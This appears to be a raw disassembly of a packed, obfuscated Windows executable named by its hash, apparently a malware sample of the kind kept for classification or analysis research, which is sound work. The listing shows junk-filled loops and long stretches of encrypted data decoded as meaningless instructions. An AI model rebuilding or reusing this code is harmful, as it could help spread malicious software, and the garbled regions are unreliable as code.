
9edc22a1b1231228bc80dc38f9dabbf9aa34b78672599ee444d9d29891c3f13a.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    DWORD PTR ds:0x433797,0x1c
  401013:	cmp    DWORD PTR ds:0x433797,0x0
  40101a:	je     0x40106d
  401020:	cmp    DWORD PTR ds:0x433797,0x6
  401027:	jne    0x401040
  40102d:	push   0x8196
  401032:	push   DWORD PTR [ebp-0xc]
  401035:	push   0x6434
  40103a:	call   DWORD PTR ds:0x412268
  401040:	cmp    DWORD PTR ds:0x433797,0x7
  401047:	jne    0x40105b
  40104d:	xor    eax,eax
  40104f:	xor    eax,DWORD PTR ds:0x433797
  401055:	dec    eax
  401056:	mov    ds:0x433797,eax
  40105b:	mov    eax,ds:0x433797
  401060:	dec    eax
  401061:	mov    ds:0x433797,eax
  401066:	jmp    0x401013
  40106b:	or     ecx,eax
  40106d:	mov    eax,ds:0x413b34
  401072:	mov    DWORD PTR [ebp-0x18],eax
  401075:	sub    DWORD PTR ds:0x43379b,0x1705
  40107f:	mov    eax,ds:0x413c44
  401084:	sub    DWORD PTR ds:0x43379f,edx
  40108a:	mov    DWORD PTR [ebp-0x48],eax
  40108d:	xor    eax,ecx
  40108f:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  401096:	add    eax,DWORD PTR ds:0x4337d3
  40109c:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  4010a3:	sbb    eax,eax
  4010a5:	mov    eax,DWORD PTR [ebp-0x10]
  4010a8:	push   ebx
  4010a9:	movzx  ebx,BYTE PTR ds:0x4337af
  4010b0:	sbb    ebx,DWORD PTR ds:0x433793
  4010b6:	mov    DWORD PTR ds:0x4337af,ebx
  4010bc:	push   esi
  4010bd:	mov    esi,0x7510854
  4010c2:	xor    eax,esi
  4010c4:	push   edi
  4010c5:	or     ecx,ebx
  4010c7:	mov    edi,0x32729b
  4010cc:	add    eax,edi
  4010ce:	and    DWORD PTR ds:0x43382b,0x264c
  4010d8:	mov    DWORD PTR [ebp-0x38],eax
  4010db:	mov    DWORD PTR ds:0x4337af,0x18
  4010e5:	cmp    DWORD PTR ds:0x4337af,0x0
  4010ec:	je     0x401146
  4010f2:	cmp    DWORD PTR ds:0x4337af,0xc
  4010f9:	jne    0x401108
  4010ff:	push   DWORD PTR [ebp-0x24]
  401102:	call   DWORD PTR ds:0x4120b4
  401108:	cmp    DWORD PTR ds:0x4337af,0xd
  40110f:	jne    0x401122
  401115:	mov    ebx,DWORD PTR ds:0x4337af
  40111b:	dec    ebx
  40111c:	mov    DWORD PTR ds:0x4337af,ebx
  401122:	xor    ebx,ebx
  401124:	add    ebx,DWORD PTR ds:0x4337af
  40112a:	dec    ebx
  40112b:	mov    DWORD PTR ds:0x4337af,ebx
  401131:	jmp    0x4010e5
  401136:	mov    ecx,DWORD PTR ds:0x433777
  40113c:	mov    eax,ds:0x433833
  401141:	sub    ecx,eax
  401143:	add    ecx,DWORD PTR [ecx+eax*1]
  401146:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40114d:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401154:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40115b:	or     DWORD PTR ds:0x43381b,0x1296
  401165:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40116c:	mov    eax,DWORD PTR [ebp-0x10]
  40116f:	sub    DWORD PTR ds:0x4336ff,0x1011
  401179:	xor    eax,esi
  40117b:	add    eax,edi
  40117d:	mov    DWORD PTR [ebp-0xc],eax
  401180:	sbb    DWORD PTR ds:0x43371f,0x6b1e
  40118a:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401191:	mov    BYTE PTR [ebp-0x11],0x67
  401195:	mov    eax,DWORD PTR [ebp-0x10]
  401198:	xor    DWORD PTR ds:0x43375b,0x46ad
  4011a2:	xor    eax,esi
  4011a4:	add    eax,edi
  4011a6:	jmp    0x401347
  4011ab:	jb     0x401145
  4011ad:	fsub   DWORD PTR [edx]
  4011af:	lock bound esi,QWORD PTR [eax+0x68]
  4011b3:	push   ecx
  4011b4:	in     al,0x70
  4011b6:	or     BYTE PTR [esi-0x25],cl
  4011b9:	and    DWORD PTR [ebx],0x7e
  4011bc:	jle    0x40123c
  4011be:	jle    0x4011ba
  4011c0:	jg     0x401240
  4011c2:	jle    0x401192
  4011c4:	xlat   BYTE PTR ds:[ebx]
  4011c5:	cmp    eax,0xcfd339d5
  4011ca:	rol    eax,1
  4011cc:	pop    es
  4011cd:	add    al,0x3
  4011cf:	add    DWORD PTR [eax+0x0],ecx
  4011d2:	rdpmc  
  4011d4:	xadd   BYTE PTR [eax],bl
  4011d7:	(bad)  
  4011d8:	adc    BYTE PTR [edi],bl
  4011da:	mov    ecx,0xddb70058
  4011df:	push   cs
  4011e0:	out    dx,eax
  4011e1:	mov    ebp,0x8e03d6db
  4011e6:	es mov esi,0x1541a2f4
  4011ec:	lods   eax,DWORD PTR ds:[esi]
  4011ed:	fiadd  WORD PTR [esi+0x1f]
  4011f0:	data16 in al,dx
  4011f2:	outs   dx,DWORD PTR ds:[esi]
  4011f3:	or     edx,DWORD PTR [ecx]
  4011f5:	pushf  
  4011f6:	js     0x4011ce
  4011f8:	inc    eax
  4011f9:	stos   BYTE PTR es:[edi],al
  4011fa:	push   ebx
  4011fb:	sub    eax,0xad3cc4d1
  401200:	mov    bh,BYTE PTR [ebx-0x3b]
  401203:	stos   DWORD PTR es:[edi],eax
  401204:	push   es
  401205:	(bad)  
  401206:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  40120c:	jmp    0x40123e
  40120e:	mov    ebp,ecx
  401210:	dec    edi
  401211:	out    0xa6,al
  401213:	inc    ecx
  401214:	call   DWORD PTR [edi-0x2556f868]
  40121a:	mov    ebp,0x5536ed4d
  40121f:	and    esi,DWORD PTR [edx-0x43619116]
  401225:	jnp    0x401238
  401227:	ret    
  401228:	xchg   edx,eax
  401229:	and    esp,edx
  40122b:	jmp    0x40128b
  40122d:	ret    0xb8e4
  401230:	lock jmp 0xd765:0x74cf3192
  401238:	and    ch,cl
  40123a:	add    bl,cl
  40123c:	adc    DWORD PTR [ecx-0x5a],edx
  40123f:	xor    eax,0x78616f03
  401244:	or     BYTE PTR [ecx],dh
  401246:	fisttp QWORD PTR [esi+0x7f752854]
  40124c:	(bad)
  401251:	or     ebx,DWORD PTR [ebx+0x55]
  401254:	fst    st(6)
  401256:	or     ebx,edx
  401258:	pop    esp
  401259:	fstp   DWORD PTR [ecx]
  40125b:	jno    0x4011fb
  40125d:	inc    esi
  40125e:	dec    ebx
  40125f:	aaa    
  401260:	adc    eax,0x1a29772b
  401265:	sar    DWORD PTR [esi],cl
  401267:	dec    edi
  401268:	call   0xda0b73a
  40126d:	adc    edx,esp
  40126f:	xchg   DWORD PTR [eax],ecx
  401271:	or     BYTE PTR [edi-0x21feca4e],ch
  401277:	inc    eax
  401278:	mov    ecx,0xfd5416aa
  40127d:	repz hlt 
  40127f:	ds adc al,0x81
  401282:	(bad)
  401285:	in     eax,0x99
  401287:	jp     0x40127d
  401289:	or     esi,DWORD PTR [edx-0x2062866d]
  40128f:	jge    0x401253
  401291:	dec    esi
  401292:	inc    ebx
  401293:	push   ecx
  401294:	pop    es
  401295:	sbb    DWORD PTR es:[ecx+0x1164e210],edi
  40129c:	neg    esi
  40129e:	mov    al,ds:0xea1e8b03
  4012a3:	sub    DWORD PTR [esi+ebp*8],esp
  4012a6:	add    al,0x5f
  4012a8:	mov    ds:0x81966b4b,al
  4012ad:	mov    eax,0xb6fbb757
  4012b2:	mov    ecx,0xec1d98d7
  4012b7:	cmp    BYTE PTR [esi+0x7369f894],bl
  4012bd:	cmp    BYTE PTR ds:0x469b926,ah
  4012c3:	lods   eax,DWORD PTR ds:[esi]
  4012c4:	(bad)  
  4012c5:	call   0x91055c1d
  4012ca:	and    eax,DWORD PTR [edi+ebx*1-0x42]
  4012ce:	push   ecx
  4012cf:	je     0x40132e
  4012d1:	cmp    ebx,0xee7ff0d2
  4012d7:	call   0x36d89a55
  4012dc:	mov    ch,0x32
  4012df:	sar    ebp,0xe3
  4012e2:	stos   DWORD PTR es:[edi],eax
  4012e3:	mov    edi,0xbbece6d1
  4012e8:	into   
  4012e9:	inc    ebx
  4012ea:	jle    0x40135d
  4012ec:	cli    
  4012ed:	jne    0x4012cc
  4012ef:	adc    DWORD PTR [ebp-0x1417d789],esp
  4012f5:	push   cs
  4012f6:	shr    DWORD PTR [esi-0xf],1
  4012f9:	call   0x706a:0xc0d9f858
  401300:	retf   
  401301:	add    eax,0x2b69059b
  401306:	sub    eax,0x1d1e81ea
  40130b:	bound  esi,QWORD PTR [eax+0x52]
  40130e:	fs jg  0x40132e
  401311:	fcmove st,st(4)
  401313:	inc    ebp
  401314:	adc    eax,0xbfc6f75e
  401319:	pusha  
  40131a:	mov    ah,0xd8
  40131c:	jg     0x401374
  40131e:	in     eax,0x98
  401320:	pop    ss
  401321:	add    DWORD PTR [edx+eiz*2-0x28],eax
  401325:	outs   dx,DWORD PTR ds:[esi]
  401326:	lds    edx,FWORD PTR [ebp-0x5]
  401329:	sub    esp,DWORD PTR [edx+0x7f471717]
  40132f:	in     eax,0xd8
  401331:	test   BYTE PTR [edx],0x10
  401334:	inc    edi
  401335:	adc    BYTE PTR [eax],ah
  401337:	retf   
  401338:	pusha  
  401339:	retf   
  40133a:	dec    eax
  40133b:	and    bh,BYTE PTR [edx]
  40133d:	add    BYTE PTR [edi+0x70],0xb4
  401341:	das    
  401342:	addr16 dec eax
  401344:	(bad)  
  401345:	and    BYTE PTR [ecx],dl
  401347:	mov    DWORD PTR [ebp-0xc],eax
  40134a:	and    DWORD PTR ds:0x433753,0x0
  401354:	jmp    0x401366
  401359:	mov    ebx,DWORD PTR ds:0x433753
  40135f:	inc    ebx
  401360:	mov    DWORD PTR ds:0x433753,ebx
  401366:	cmp    DWORD PTR ds:0x433753,0x10
  40136d:	jae    0x401543
  401373:	cmp    DWORD PTR ds:0x433753,0x12
  40137a:	jne    0x401393
  401380:	push   0x3bad
  401385:	push   0x706b
  40138a:	push   DWORD PTR [ebp-0x20]
  40138d:	call   DWORD PTR ds:0x412284
  401393:	jmp    0x401359
  401398:	or     DWORD PTR ds:0x43370b,0x4336ff
  4013a2:	jmp    0x401543
  4013a7:	dec    ebp
  4013a8:	push   0xb1638b43
  4013ad:	push   ebp
  4013ae:	push   0xd91cd24
  4013b3:	mov    ds:0xfab099cb,al
  4013b8:	jg     0x401438
  4013ba:	jle    0x4013b6
  4013bc:	jg     0x40143c
  4013be:	jle    0x401412
  4013c0:	and    al,0xf0
  4013c2:	(bad)  
  4013c3:	push   cs
  4013c4:	xor    edx,edi
  4013c6:	(bad)  
  4013c7:	mul    BYTE PTR [ebx]
  4013c9:	out    dx,al
  4013ca:	push   cs
  4013cb:	aaa    
  4013cc:	jnp    0x4013ad
  4013ce:	test   eax,0x7ef7baff
  4013d3:	fmul   QWORD PTR [ebp-0x40]
  4013d6:	sub    BYTE PTR gs:[ecx],bh
  4013d9:	jcxz   0x4013e1
  4013dc:	jmp    0x4013ec
  4013de:	lds    ebp,FWORD PTR [ebx+eiz*4+0x37]
  4013e2:	xchg   esi,eax
  4013e3:	or     eax,0xa42b2f63
  4013e8:	or     al,0x97
  4013ea:	bound  eax,QWORD PTR [esi]
  4013ec:	xor    eax,0x1b5d5682
  4013f1:	pop    ebx
  4013f2:	fstp   TBYTE PTR [ecx]
  4013f4:	xor    ah,BYTE PTR [esi]
  4013f6:	fild   WORD PTR [edx+esi*1-0x77]
  4013fa:	jae    0x40141c
  4013fc:	(bad)  
  4013fd:	pop    es
  4013fe:	push   esi
  4013ff:	mov    DWORD PTR [ecx-0x4cc3407c],ebp
  401405:	xlat   BYTE PTR ds:[ebx]
  401406:	(bad)  
  401407:	leave  
  401408:	test   cl,al
  40140a:	test   eax,0x76535ce
  40140f:	mov    edx,0x3aee17b5
  401414:	(bad)  
  401415:	fwait
  401416:	pop    ds
  401417:	adc    BYTE PTR [edx-0x470671a3],0x91
  40141e:	push   ebx
  40141f:	mov    cl,0x37
  401421:	rcr    dh,0xba
  401424:	jb     0x401448
  401426:	sbb    al,0xa8
  401428:	adc    ecx,eax
  40142a:	xor    bh,BYTE PTR [esi]
  40142c:	shl    BYTE PTR [esi],1
  40142e:	fisubr DWORD PTR [edx]
  401430:	cmc    
  401431:	daa    
  401432:	mov    dh,0xe4
  401434:	pop    edx
  401435:	call   0x3f23:0x2080d3bb
  40143c:	in     eax,0x3c
  40143e:	mov    ds:0xfbd12d76,al
  401443:	clc    
  401444:	sub    eax,0x57206d64
  401449:	clc    
  40144a:	dec    esp
  40144b:	cmp    BYTE PTR [ebx-0x3f],dh
  40144e:	xchg   DWORD PTR [eax-0x5cdee94b],edi
  401454:	sbb    bh,BYTE PTR [ebx+eax*8]
  401457:	ret    0xc959
  40145a:	ret    
  40145b:	pop    eax
  40145c:	int    0xac
  40145e:	xchg   edx,eax
  40145f:	fldenv [edx+0x6a]
  401462:	jle    0x401418
  401464:	mov    edi,0xcbf13c68
  401469:	push   edx
  40146a:	test   al,0x12
  40146c:	dec    edi
  40146d:	pusha  
  40146e:	mov    esi,0xd8fb89c6
  401473:	(bad)  
  401474:	jp     0x4014ce
  401476:	sbb    BYTE PTR [esi],cl
  401478:	fdivr  DWORD PTR [ebx+0x18]
  40147c:	test   ah,ch
  40147e:	(bad)  
  401480:	outs   dx,BYTE PTR ds:[esi]
  401481:	cli    
  401482:	loope  0x401469
  401484:	push   ecx
  401485:	mov    dh,0x4b
  401487:	inc    ebp
  401488:	push   ebp
  401489:	inc    esp
  40148a:	iret   
  40148b:	sub    eax,0xe93effc8
  401490:	add    ebx,ebp
  401492:	inc    ebx
  401493:	sbb    eax,0x47c0c54d
  401498:	ret    0xd7da
  40149b:	xchg   DWORD PTR ds:0x8773df84,esp
  4014a1:	popa   
  4014a2:	test   dl,ah
  4014a4:	add    ch,BYTE PTR [ebp+0x3ef096a2]
  4014aa:	xchg   ebp,eax
  4014ab:	xchg   BYTE PTR ds:0x22db9f37,cl
  4014b1:	es push ebx
  4014b3:	(bad)  
  4014b5:	imul   eax,DWORD PTR [eax],0xffffff81
  4014b8:	cmp    bl,0x4d
  4014bb:	jg     0x40149e
  4014bd:	mov    esp,DWORD PTR [esi+esi*1]
  4014c0:	inc    edx
  4014c1:	scas   al,BYTE PTR es:[edi]
  4014c2:	mov    edx,eax
  4014c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014c5:	fwait
  4014c6:	mov    ds:0x37e801c6,al
  4014cb:	aaa    
  4014cc:	jmp    FWORD PTR [ecx]
  4014ce:	(bad)  
  4014cf:	adc    ah,al
  4014d1:	stc    
  4014d2:	sahf   
  4014d3:	xor    DWORD PTR [ebx],esp
  4014d5:	inc    ebp
  4014d6:	cmp    DWORD PTR [eax-0x5a],eax
  4014d9:	not    ch
  4014db:	cmp    BYTE PTR [ecx],ah
  4014dd:	push   DWORD PTR [edi]
  4014df:	retf   0x1cae
  4014e2:	jmp    FWORD PTR [esi+0x3c]
  4014e5:	es es cld 
  4014e8:	or     eax,0x4930541b
  4014ed:	and    eax,0x14b713e0
  4014f2:	test   BYTE PTR [ecx-0x9e804c5],ah
  4014f8:	cwde   
  4014f9:	dec    esi
  4014fa:	out    0x58,al
  4014fc:	hlt    
  4014fd:	xchg   DWORD PTR [eax+ebx*8],esi
  401500:	cli    
  401501:	clc    
  401502:	or     al,0xcf
  401504:	add    DWORD PTR [ebx+eiz*4-0x38835b12],edx
  40150b:	retf   
  40150c:	shl    DWORD PTR [edi-0x43],1
  40150f:	jmp    0x8676:0x7b266bca
  401516:	sar    BYTE PTR [esi+0x50e290ad],0x12
  40151d:	(bad)
  401520:	test   ch,dl
  401522:	adc    BYTE PTR [esi],bl
  401524:	or     edi,DWORD PTR [eax]
  401526:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401527:	fwait
  401528:	imul   ebx,DWORD PTR [edx-0x738fe94f],0x5da3683a
  401532:	outs   dx,DWORD PTR ds:[esi]
  401533:	and    al,bl
  401535:	xchg   edi,eax
  401536:	div    DWORD PTR [ebp+0x37e948f6]
  40153c:	test   cl,dl
  40153e:	fst    DWORD PTR [ecx-0x6f]
  401541:	outs   dx,DWORD PTR ds:[esi]
  401542:	and    al,0x8b
  401544:	inc    ebp
  401545:	les    esi,FWORD PTR [ecx]
  401547:	sbb    eax,0x43370f
  40154c:	xor    eax,esi
  40154e:	neg    ecx
  401550:	jmp    0x4016f1
  401555:	cli    
  401556:	fcomp  QWORD PTR [edx-0x4caea7e9]
  40155c:	jno    0x4014f6
  40155e:	cmp    ah,BYTE PTR [ebx+0x1a6ae7e3]
  401564:	adc    eax,0x7e7e7d06
  401569:	cli    
  40156a:	jg     0x4015ea
  40156c:	jle    0x40152d
  40156e:	xchg   esi,eax
  40156f:	jmp    FWORD PTR [eax]
  401571:	mov    ebx,0x7b939387
  401576:	mov    ebp,0x7930894a
  40157b:	pop    esp
  40157c:	fdivr  st,st(6)
  40157e:	mov    eax,ds:0xed63cf3f
  401583:	in     eax,0xe0
  401585:	stc    
  401586:	ins    BYTE PTR es:[edi],dx
  401587:	aas    
  401588:	das    
  401589:	pop    edx
  40158a:	mov    cl,0x77
  40158c:	push   ss
  40158d:	mov    ebx,0x9c7688ae
  401592:	sbb    BYTE PTR [eax],ah
  401594:	inc    DWORD PTR [edi+ecx*4+0x4ac00962]
  40159b:	out    0x4,al
  40159d:	gs jmp 0x4015e5
  4015a0:	sub    BYTE PTR [eax+0x4e979924],dh
  4015a6:	jmp    DWORD PTR [ebp-0x78c928ac]
  4015ac:	(bad)  
  4015ae:	or     cl,bl
  4015b0:	mov    BYTE PTR [ebx],cl
  4015b2:	call   0x9dc4f62c
  4015b7:	clc    
  4015b8:	xlat   BYTE PTR ds:[ebx]
  4015b9:	add    al,0xa3
  4015bb:	xor    BYTE PTR [edi+0x62],0x1
  4015bf:	retf   
  4015c0:	loop   0x401567
  4015c2:	push   edi
  4015c3:	into   
  4015c4:	fdivr  QWORD PTR [edi+0x317da873]
  4015ca:	dec    eax
  4015cb:	arpl   WORD PTR [edx],bx
  4015cd:	int3   
  4015ce:	inc    ebp
  4015cf:	mov    WORD PTR [edi+0x4d614e53],gs
  4015d5:	hlt    
  4015d6:	cli    
  4015d7:	and    al,ch
  4015d9:	in     eax,0xa9
  4015db:	fistp  DWORD PTR [edi]
  4015dd:	pop    ebp
  4015de:	sub    dh,BYTE PTR [eax+0x76]
  4015e1:	fsubr  QWORD PTR [ebx]
  4015e3:	mov    dl,0x58
  4015e5:	iret   
  4015e6:	out    dx,al
  4015e7:	lods   al,BYTE PTR ds:[esi]
  4015e8:	mov    ebx,0x59f29e9
  4015ed:	gs lahf 
  4015ef:	dec    edi
  4015f0:	push   esi
  4015f1:	push   0xaee5951c
  4015f6:	jns    0x401652
  4015f8:	jl     0x4015f8
  4015fa:	int    0x7e
  4015fc:	mov    DWORD PTR [eax-0x5cda47e3],ecx
  401602:	js     0x40162f
  401604:	mov    WORD PTR [ecx+0x624e983d],cs
  40160a:	mov    dh,0x8a
  40160c:	xor    al,0xc
  40160e:	inc    ebx
  40160f:	mov    cl,0xac
  401611:	push   esp
  401612:	lods   eax,DWORD PTR ds:[esi]
  401613:	push   esi
  401614:	inc    edi
  401615:	xor    eax,0x4730d7e2
  40161a:	sub    eax,0x192f2ddb
  40161f:	idiv   DWORD PTR [ecx+0x6f]
  401622:	add    dh,BYTE PTR [ebx]
  401624:	ret    
  401625:	test   al,0xcb
  401627:	adc    DWORD PTR [ebx-0x7504e872],0x55f78341
  401631:	or     BYTE PTR [ebx-0x6d],bh
  401634:	jmp    0x4016b3
  401636:	inc    esp
  401637:	sbb    al,0xa4
  401639:	imul   edx,DWORD PTR [edx],0x5913e8cc
  40163f:	xor    al,0xc2
  401641:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401642:	(bad)  
  401644:	imul   ecx,DWORD PTR [edi-0xd],0xd9f6ce38
  40164b:	jecxz  0x40168d
  40164d:	gs xchg ebx,eax
  40164f:	inc    esp
  401650:	or     eax,0xd769295a
  401655:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401656:	cmp    eax,0x3a379f52
  40165b:	retf   
  40165c:	mov    al,ds:0xbc0a32ac
  401661:	inc    ebp
  401662:	add    eax,0xb86415b1
  401667:	loope  0x4016a8
  401669:	mov    DWORD PTR [ebx+0x26],edi
  40166c:	rol    BYTE PTR [edx+0x50],cl
  40166f:	arpl   cx,dx
  401671:	ret    0x279c
  401674:	repnz (bad) 
  401676:	fsubr  DWORD PTR [ebx]
  401678:	les    esi,FWORD PTR [eax+eax*4-0x3c6131b4]
  40167f:	push   edx
  401680:	push   es
  401681:	out    dx,al
  401682:	std    
  401683:	cmp    BYTE PTR [ebx+0x4],ah
  401686:	leave  
  401687:	or     al,0x38
  401689:	scas   eax,DWORD PTR es:[edi]
  40168a:	lahf   
  40168b:	xchg   esp,eax
  40168c:	xchg   DWORD PTR [edx-0x3],ebx
  40168f:	inc    BYTE PTR [ecx]
  401691:	dec    esp
  401692:	iret   
  401693:	sbb    eax,0x899d734b
  401698:	lds    edx,FWORD PTR [edi+0x61]
  40169b:	sub    DWORD PTR [ebx],edi
  40169d:	pushf  
  40169e:	in     eax,0xbb
  4016a0:	jnp    0x401684
  4016a2:	rol    edx,0x56
  4016a5:	(bad)  
  4016a6:	std    
  4016a7:	pop    eax
  4016a8:	loope  0x40164b
  4016aa:	dec    edi
  4016ab:	test   eax,0xc39a36cc
  4016b0:	dec    eax
  4016b1:	xchg   al,bh
  4016b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016b4:	adc    edi,esp
  4016b6:	fwait
  4016b7:	and    al,0xde
  4016b9:	xor    DWORD PTR ds:0xdf534fd9,0x3579fde9
  4016c3:	adc    eax,DWORD PTR [ebx-0x76]
  4016c6:	cmp    ebx,DWORD PTR [ecx]
  4016c8:	dec    esp
  4016c9:	stc    
  4016ca:	ins    BYTE PTR es:[edi],dx
  4016cb:	sbb    BYTE PTR [edx+ecx*2-0x5aacb6b1],dh
  4016d2:	inc    edi
  4016d3:	fisttp DWORD PTR [ebx+0x68]
  4016d6:	cmp    bl,BYTE PTR [ecx]
  4016d8:	lock mov dl,0x90
  4016db:	or     BYTE PTR [esi],bl
  4016dd:	in     al,0x8d
  4016df:	sub    al,0x8b
  4016e1:	pop    esi
  4016e2:	and    DWORD PTR [ebp+0x2ec345ab],eax
  4016e8:	pop    ds
  4016e9:	xchg   edx,eax
  4016ea:	pop    esi
  4016eb:	repnz fld DWORD PTR [ecx+0x325d357]
  4016f2:	(bad)  
  4016f3:	mov    DWORD PTR [ebp-0x34],eax
  4016f6:	mov    eax,DWORD PTR [ebp-0x44]
  4016f9:	xor    eax,esi
  4016fb:	sbb    ecx,ecx
  4016fd:	add    eax,edi
  4016ff:	mov    DWORD PTR [ebp-0x30],eax
  401702:	mov    eax,DWORD PTR [ebp-0x28]
  401705:	and    DWORD PTR ds:0x4337df,0x0
  40170f:	jmp    0x401721
  401714:	mov    ebx,DWORD PTR ds:0x4337df
  40171a:	inc    ebx
  40171b:	mov    DWORD PTR ds:0x4337df,ebx
  401721:	cmp    DWORD PTR ds:0x4337df,0x18
  401728:	jae    0x40176c
  40172e:	cmp    DWORD PTR ds:0x4337df,0xa
  401735:	jne    0x40174b
  40173b:	push   0x7b82
  401740:	push   0x1a57
  401745:	call   DWORD PTR ds:0x41226c
  40174b:	cmp    DWORD PTR ds:0x4337df,0x9
  401752:	jne    0x401767
  401758:	xor    ebx,ebx
  40175a:	xor    ebx,DWORD PTR ds:0x4337df
  401760:	inc    ebx
  401761:	mov    DWORD PTR ds:0x4337df,ebx
  401767:	jmp    0x401714
  40176c:	xor    eax,esi
  40176e:	sbb    DWORD PTR ds:0x433703,0x47a9
  401778:	add    eax,edi
  40177a:	dec    DWORD PTR ds:0x433717
  401780:	mov    DWORD PTR [ebp-0x2c],eax
  401783:	lea    eax,[ebp-0x98]
  401789:	mov    DWORD PTR [ebp-0x8],eax
  40178c:	movzx  ecx,WORD PTR ds:0x43370b
  401793:	and    ecx,DWORD PTR ds:0x43375b
  401799:	mov    DWORD PTR ds:0x43370b,ecx
  40179f:	mov    eax,DWORD PTR [ebp-0x10]
  4017a2:	mov    DWORD PTR [ebp-0x24],eax
  4017a5:	and    DWORD PTR ds:0x43382f,0x0
  4017af:	jmp    0x4017c3
  4017b4:	xor    ebx,ebx
  4017b6:	or     ebx,DWORD PTR ds:0x43382f
  4017bc:	inc    ebx
  4017bd:	mov    DWORD PTR ds:0x43382f,ebx
  4017c3:	cmp    DWORD PTR ds:0x43382f,0x1c
  4017ca:	jae    0x40184e
  4017d0:	cmp    DWORD PTR ds:0x43382f,0x11
  4017d7:	jne    0x4017f0
  4017dd:	push   DWORD PTR [ebp-0x14]
  4017e0:	push   0x35e4
  4017e5:	push   0x7b35
  4017ea:	call   DWORD PTR ds:0x412270
  4017f0:	cmp    DWORD PTR ds:0x43382f,0x10
  4017f7:	jne    0x40180a
  4017fd:	mov    ebx,DWORD PTR ds:0x43382f
  401803:	inc    ebx
  401804:	mov    DWORD PTR ds:0x43382f,ebx
  40180a:	jmp    0x4017b4
  40180f:	and    DWORD PTR ds:0x4337e3,0x0
  401819:	mov    eax,ds:0x4337e3
  40181e:	inc    eax
  40181f:	mov    ds:0x4337e3,eax
  401824:	cmp    DWORD PTR ds:0x4337e3,0x27
  40182b:	jne    0x401841
  401831:	push   0x1cc5
  401836:	push   0x433723
  40183b:	call   DWORD PTR ds:0x412338
  401841:	cmp    DWORD PTR ds:0x4337e3,0x1d
  401848:	jb     0x401819
  40184e:	mov    eax,DWORD PTR [ebp-0x1c]
  401851:	xor    ebx,DWORD PTR ds:0x43381f
  401857:	mov    DWORD PTR [ebp-0x20],eax
  40185a:	and    DWORD PTR ds:0x43382b,0x0
  401864:	jmp    0x401878
  401869:	xor    ecx,ecx
  40186b:	xor    ecx,DWORD PTR ds:0x43382b
  401871:	inc    ecx
  401872:	mov    DWORD PTR ds:0x43382b,ecx
  401878:	cmp    DWORD PTR ds:0x43382b,0x12
  40187f:	jae    0x4018d1
  401885:	cmp    DWORD PTR ds:0x43382b,0x4
  40188c:	jne    0x4018b2
  401892:	push   0x6e91
  401897:	push   DWORD PTR [ebp-0x10]
  40189a:	push   DWORD PTR [ebp-0x24]
  40189d:	push   0x5930
  4018a2:	push   0x63f1
  4018a7:	push   0x153a
  4018ac:	call   DWORD PTR ds:0x412274
  4018b2:	cmp    DWORD PTR ds:0x43382b,0x3
  4018b9:	jne    0x4018cc
  4018bf:	mov    ecx,DWORD PTR ds:0x43382b
  4018c5:	inc    ecx
  4018c6:	mov    DWORD PTR ds:0x43382b,ecx
  4018cc:	jmp    0x401869
  4018d1:	mov    ebx,0xf89c853d
  4018d6:	jmp    0x401a77
  4018db:	or     ecx,esi
  4018dd:	out    0x8,al
  4018df:	jecxz  0x401911
  4018e1:	icebp  
  4018e2:	int    0x17
  4018e4:	add    eax,0xed026ade
  4018e9:	adc    eax,DWORD PTR [ebx+0x7e7e7a82]
  4018ef:	cli    
  4018f0:	jg     0x401970
  4018f2:	jle    0x40191f
  4018f4:	add    bl,BYTE PTR [eax-0x434cc78]
  4018fa:	sti    
  4018fb:	adc    esp,DWORD PTR [edx-0x14556c2a]
  401901:	sub    ecx,DWORD PTR [eax-0x4fd3abb7]
  401907:	sbb    eax,0x1a1f84a5
  40190c:	cmp    ecx,DWORD PTR [ebx]
  40190e:	mov    esi,0xf31d0165
  401913:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401914:	or     dh,BYTE PTR [esi-0x2e]
  401917:	lahf   
  401918:	mov    edi,DWORD PTR [edi-0x77bb9fd4]
  40191e:	xchg   esp,ecx
  401920:	dec    ebx
  401921:	lds    eax,FWORD PTR [edi+0x71]
  401924:	push   esp
  401925:	xchg   ebx,eax
  401926:	ja     0x4018f7
  401928:	mov    BYTE PTR [ebp-0x15],0x10
  40192c:	jnp    0x401999
  40192e:	mov    al,ds:0x7d0199e8
  401933:	pop    es
  401934:	fbstp  TBYTE PTR [esi+0x7c]
  401937:	inc    eax
  401938:	fwait
  401939:	dec    esp
  40193a:	fidivr WORD PTR [ebp-0x18905c62]
  401940:	jns    0x4018fc
  401942:	inc    BYTE PTR [eax-0x5]
  401945:	pop    ebx
  401946:	mov    ebx,0x42e26fe6
  40194b:	adc    al,dl
  40194d:	loope  0x40190b
  40194f:	xlat   BYTE PTR ds:[bx]
  401951:	gs shl ecx,0x8
  401955:	inc    edi
  401956:	push   es
  401957:	jp     0x401919
  401959:	mov    edi,0x561940a7
  40195e:	std    
  40195f:	(bad)  
  401960:	loope  0x40195c
  401962:	push   edi
  401963:	pop    ss
  401964:	adc    cl,BYTE PTR [eax-0x17e022e2]
  40196a:	aad    0xbf
  40196c:	xchg   ecx,eax
  40196d:	scas   eax,DWORD PTR es:[edi]
  40196e:	jnp    0x4019b7
  401970:	mov    eax,0x39e5e888
  401975:	js     0x40198e
  401977:	push   ebx
  401978:	inc    esp
  401979:	test   BYTE PTR [ebx],bl
  40197b:	mov    dh,0x6d
  40197d:	ror    cl,1
  40197f:	call   0xdb4:0x66a4c8a3
  401986:	vmovlps QWORD PTR [edx+0x73315c21],xmm1
  40198e:	jecxz  0x401a00
  401990:	pop    ebx
  401991:	sub    edx,DWORD PTR [ebp+ebx*2+0x49]
  401995:	das    
  401996:	jg     0x401979
  401998:	lahf   
